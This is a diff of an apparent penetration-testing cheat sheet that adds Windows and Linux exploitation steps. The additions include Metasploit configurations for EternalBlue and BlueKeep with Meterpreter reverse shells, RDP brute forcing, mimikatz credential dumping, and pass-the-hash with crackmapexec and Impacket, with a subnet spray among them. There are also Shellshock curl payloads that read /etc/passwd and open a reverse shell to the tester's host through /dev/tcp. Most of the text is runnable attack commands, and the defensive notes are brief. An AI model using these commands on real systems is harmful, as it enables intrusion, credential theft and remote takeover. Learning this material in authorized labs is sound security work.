@@ -67,7 +67,9 @@ nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
 # metasploit
 use auxiliary/scanner/smb/smb_login               # USER_FILE / PASS_FILE
 use exploit/windows/smb/psexec                     # set SMBUser/SMBPass
-use exploit/windows/smb/ms17_010_eternalblue
+# EternalBlue MS17-010 (CVE-2017-0143, SMBv1, unauth RCE → SYSTEM; Vista–2012 R2; WannaCry)
+use auxiliary/scanner/smb/smb_ms17_010 ; set RHOSTS <TARGET_IP> ; run   # confirm first
+use exploit/windows/smb/ms17_010_eternalblue       # set RHOSTS/LHOST ; payload windows/x64/meterpreter/reverse_tcp → getuid = NT AUTHORITY\SYSTEM
 psexec.py <USER>@<TARGET_IP> cmd.exe
 # Manual EternalBlue (AutoBlue-MS17-010)
 git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
@@ -79,11 +81,15 @@ cd .. && python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_x64.bin
 
 ## RDP
 ```bash
-nmap -sV <TARGET_IP>
+nmap -sV <TARGET_IP>                                  # 3389/tcp ms-wbt-server = RDP
 use auxiliary/scanner/rdp/rdp_scanner
-use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
-use exploit/windows/rdp/cve_2019_0708_bluekeep_rce   # ! may crash kernel ! set target / GROOMSIZE 50
+# BlueKeep CVE-2019-0708 (unauth RCE → SYSTEM; affects XP–2008 R2; NLA blocks it)
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep ; set RHOSTS <TARGET_IP> ; run   # "target is vulnerable"
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce   # ! kernel crash risk !
+#   show targets ; set TARGET 2 (Win7 SP1/2008 R2 x64) ; set PAYLOAD windows/x64/meterpreter/reverse_tcp ; set LHOST
+#   crash-tuning: set GROOMSIZE 50 / GROOM_ALLOCATIONS 25 / GROOM_DELTA 5 ; set VERBOSE true → exploit
 hydra -L common_users.txt -P unix_passwords.txt rdp://<TARGET_IP> -s <PORT>
+crowbar -b rdp -s <TARGET_IP>/32 -u <USER> -C <wordlist> -n 1
 xfreerdp /u:<USER> /p:<PW> /v:<TARGET_IP>:<PORT>
 xfreerdp /u:<USER> /p:<PW> /v:<TARGET_IP>:<PORT> /w:1920 /h:1080 /fonts /smart-sizing
 ```
@@ -141,10 +147,17 @@ load kiwi ; creds_all ; lsa_dump_sam ; lsa_dump_secrets
 # mimikatz:
 upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ; shell
 mimikatz.exe → privilege::debug ; lsadump::sam ; lsadump::secrets ; sekurlsa::logonPasswords
-# Pass-the-Hash:
-use exploit/windows/smb/psexec                     # set SMBUser Administrator / SMBPass <LM:NTLM>
-crackmapexec smb <TARGET_IP> -u Administrator -H "<NTLM_HASH>" -x "whoami"
+# Pass-the-Hash (authenticate with the NTLM hash — no cracking; works post-patch; lateral movement)
+#   hash line format = user:RID:LMhash:NTLMhash:::  (LM is often AAD3B...=empty)
+#   Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
+use exploit/windows/smb/psexec                     # set SMBUser Administrator / SMBPass <LM>:<NTLM> ; target 1=upload 2=PowerShell
+crackmapexec smb <TARGET_IP> -u Administrator -H <NTLM> -x "whoami"       # -X for PowerShell ; --local-auth for local acct
+crackmapexec smb <range> -u Administrator -H <NTLM> -x hostname           # spray a subnet for reuse
+# Impacket (pass -hashes LM:NTLM):
+psexec.py  -hashes <LM>:<NTLM> <DOMAIN>/Administrator@<TARGET_IP>
+wmiexec.py -hashes <LM>:<NTLM> <DOMAIN>/Administrator@<TARGET_IP>          # wmiexec often more reliable/quieter
 ```
+ACCESS_DENIED → check hash + privileges; payload fails → try other psexec target or wmiexec. Defense: Credential Guard, LAPS, restrict WMI/DCOM, NTLM auditing.
 
 ---
 # Linux Exploitation
@@ -166,10 +179,19 @@ nmap --script vuln <TARGET_IP>
 ```
 Common chains: Apache vuln → web shell → reverse shell → privesc · weak SSH creds → access → lateral → exfil · Samba RCE → root. Hardening (report): SSH `PermitRootLogin no` + key-only + non-default port; Apache `ServerTokens Prod`/`ServerSignature Off`/`Options -Indexes`; Samba `server min protocol = SMB2`.
 
-## Shellshock (Apache mod_cgi)
+## Shellshock (CVE-2014-6271, Bash ≤4.3 via CGI)
+Bash runs trailing commands in a crafted env var: `() { :; }; <cmd>`. Injected through HTTP headers (User-Agent/Cookie/Referer) that CGI passes to Bash → RCE as the web-server user.
 ```bash
-nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <TARGET_IP>
-use exploit/multi/http/apache_mod_cgi_bash_env_exec   # set TARGETURI /gettime.cgi
+# find CGI: /cgi-bin/ , /cgi-bin/{test,status,admin}.cgi , /gettime.cgi
+# detect
+nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/test.cgi <TARGET_IP>
+curl -H "User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd" http://<TARGET_IP>/cgi-bin/test.cgi
+# reverse shell via header (start nc -nlvp 1234 first)
+curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<LOCAL_HOST_IP>/1234 0>&1" http://<TARGET_IP>/cgi-bin/test.cgi
+# metasploit
+use exploit/multi/http/apache_mod_cgi_bash_env_exec   # set RHOSTS/TARGETURI /gettime.cgi ; payload linux/x86/meterpreter/reverse_tcp (or cmd/unix/reverse_bash)
+# local vuln test / fix check
+env x='() { :;}; echo vulnerable' bash -c "echo test"   # prints "vulnerable" = unpatched
 ```
 
 ## FTP / SSH / Samba footholds
